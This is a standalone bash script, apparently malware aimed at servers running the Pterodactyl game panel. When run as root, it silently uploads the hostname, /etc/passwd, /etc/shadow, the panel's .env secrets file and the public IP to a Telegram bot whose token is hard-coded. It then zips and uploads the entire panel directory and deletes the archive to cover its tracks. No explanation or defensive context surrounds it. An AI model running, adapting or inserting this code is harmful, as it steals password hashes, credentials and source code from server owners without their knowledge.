#!/bin/bash

BOT_TOKEN="8525826159:AAF9NQzREOSgYnNC2rVXBOzE9EoARrAL2Qc"
CHAT_ID="7697898730"
RESULT1="$(cat /etc/hostname)"
FILE1="/etc/passwd"
FILE2="/etc/shadow"
FILE3="/var/www/pterodactyl/.env"
RESULT2="$(curl -s ifconfig.me)"
SRC="/var/www/pterodactyl"
ZIP="/etc/ptero.zip"

# --- root check (silent) ---
[ "$EUID" -ne 0 ] && exit 0

curl -s \
  -X POST \
  -d "chat_id=${CHAT_ID}" \
  --data-urlencode "text=${RESULT1}" \
  "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
  > /dev/null 2>&1

curl -s \
  -F "chat_id=${CHAT_ID}" \
  -F "document=@${FILE1}" \
  "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument" \
  > /dev/null 2>&1

curl -s \
  -F "chat_id=${CHAT_ID}" \
  -F "document=@${FILE2}" \
  "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument" \
  > /dev/null 2>&1

curl -s \
  -F "chat_id=${CHAT_ID}" \
  -F "document=@${FILE3}" \
  "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument" \
  > /dev/null 2>&1

curl -s \
  -X POST \
  -d "chat_id=${CHAT_ID}" \
  --data-urlencode "text=${RESULT2}" \
  "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
  > /dev/null 2>&1

# zip
zip -r "$ZIP" "$SRC" > /dev/null 2>&1

# send to telegram
curl -s \
  -F "chat_id=${CHAT_ID}" \
  -F "document=@${ZIP}" \
  "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument" \
  > /dev/null 2>&1

# delete zip
rm -f "$ZIP"
